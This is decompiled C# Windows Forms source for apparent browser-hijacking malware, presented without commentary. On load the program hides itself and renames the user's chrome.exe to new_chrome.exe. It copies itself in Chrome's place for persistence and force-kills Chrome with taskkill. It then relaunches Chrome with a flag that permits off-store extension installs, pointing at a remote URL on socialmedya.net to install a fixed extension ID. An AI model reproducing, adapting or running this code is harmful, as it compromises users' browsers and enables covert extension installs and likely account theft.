using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using WindowsApplication1.My;

namespace WindowsApplication1;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	private string AppId;

	private string chrome;

	private string username;

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		__ENCAddToList(this);
		AppId = "hhommgjjeekpmpcbdmfnhpchijdkgaei";
		chrome = "";
		username = MyProject.User.get_Name().ToString().Split(new char[1] { '\\' })[1];
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(284, 262);
		((Form)this).set_ClientSize(clientSize);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}

	private void Degistir()
	{
		if (!((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Users\\" + username + "\\AppData\\Local\\Google\\Chrome\\Application\\new_chrome.exe"))
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().RenameFile(chrome, "new_chrome.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), chrome);
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)this).Hide();
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_TopMost(true);
		if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Users\\" + username + "\\AppData\\Local\\Google\\Chrome\\Application\\chrome.exe"))
		{
			chrome = "C:\\Users\\" + username + "\\AppData\\Local\\Google\\Chrome\\Application\\chrome.exe";
			Degistir();
		}
		else if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"))
		{
			chrome = "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe";
			Degistir();
		}
		else if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Documents and Settings\\" + username + "\\Local Settings\\Application Data\\Google\\Chrome\\Application\\chrome.exe"))
		{
			chrome = "C:\\Documents and Settings\\" + username + "\\Local Settings\\Application Data\\Google\\Chrome\\Application\\chrome.exe";
			Degistir();
		}
		else if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"))
		{
			chrome = "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe";
			Degistir();
		}
		if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Users\\" + username + "\\AppData\\Local\\Google\\Chrome\\Application\\new_chrome.exe"))
		{
			chrome = "C:\\Users\\" + username + "\\AppData\\Local\\Google\\Chrome\\Application\\new_chrome.exe";
		}
		else if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Program Files (x86)\\Google\\Chrome\\Application\\new_chrome.exe"))
		{
			chrome = "C:\\Program Files (x86)\\Google\\Chrome\\Application\\new_chrome.exe";
		}
		else if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Documents and Settings\\" + username + "\\Local Settings\\Application Data\\Google\\Chrome\\Application\\new_chrome.exe"))
		{
			chrome = "C:\\Documents and Settings\\" + username + "\\Local Settings\\Application Data\\Google\\Chrome\\Application\\new_chrome.exe";
		}
		else if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Program Files\\Google\\Chrome\\Application\\new_chrome.exe"))
		{
			chrome = "C:\\Program Files (x86)\\Google\\Chrome\\Application\\new_chrome.exe";
		}
		if (Operators.CompareString(chrome, "", false) != 0)
		{
			if (!((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists("C:\\Users\\" + username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions\\" + AppId) & !((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists("C:\\Documents and Settings\\" + username + "\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\Default\\Extensions\\" + AppId))
			{
				if (Process.GetProcessesByName("chrome").Length > 1)
				{
					Interaction.Shell("taskkill /f /im chrome.exe", (AppWinStyle)2, false, -1);
					Thread.Sleep(1000);
				}
				Interaction.Shell(chrome + " --enable-easy-off-store-extension-install http://socialmedya.net/index.php?extension=true", (AppWinStyle)2, false, -1);
			}
			else
			{
				Interaction.Shell(chrome, (AppWinStyle)2, false, -1);
			}
		}
		ProjectData.EndApp();
	}
}
